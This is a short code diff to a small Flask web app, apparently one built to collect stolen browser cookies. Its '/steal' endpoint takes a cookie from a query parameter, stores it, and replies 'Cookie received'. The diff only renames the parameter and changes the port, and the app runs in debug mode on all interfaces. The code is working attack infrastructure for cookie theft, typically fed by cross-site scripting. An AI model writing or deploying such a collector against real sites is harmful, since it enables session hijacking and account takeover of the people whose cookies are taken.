@@ -32,11 +32,11 @@ def index():
 
 @app.route('/steal', methods=['GET'])
 def steal():
-    cookie = request.args.get('c')
+    cookie = request.args.get('cookie')
     if cookie:
         guardar_cookie(cookie)
         return "Cookie received", 200
     return "No cookie provided", 400
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5002, debug=True)
+    app.run(host='0.0.0.0', port=5001, debug=True)
